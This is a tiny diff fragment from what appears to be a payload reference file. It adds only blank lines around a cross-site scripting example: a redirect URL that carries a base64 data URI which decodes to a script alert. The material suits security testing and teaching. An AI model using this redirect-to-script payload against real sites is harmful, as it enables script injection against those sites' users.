@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:23:05.937187+00:00'
 ```powershell
 http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
 ```
+
+
